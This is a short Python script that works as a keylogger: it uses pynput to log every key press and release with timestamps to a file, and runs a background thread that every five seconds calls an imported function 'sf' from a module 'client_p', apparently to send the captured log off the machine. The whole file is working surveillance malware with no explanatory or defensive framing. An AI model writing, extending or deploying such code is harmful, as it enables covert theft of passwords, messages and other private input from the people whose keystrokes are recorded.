import logging
import time
from pynput import keyboard
from client_p import sf
import threading

def rs():
    while(True):
        time.sleep(5)
        sf()


log_dir = "./"
logging.basicConfig(filename=(log_dir + "logs.txt"), level=logging.DEBUG, format='%(asctime)s, %(message)s')
logging.getLogger("urllib3").setLevel(logging.WARNING)

def on_press(key):
    try:
        logging.info('pressed : {0}'.format(key.char))
    except AttributeError:
        logging.info('pressed : {0}'.format(key))

def on_release(key):
    logging.info('released : {0}'.format(key))

threading.Thread(target=rs).start()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener :
    listener.join()
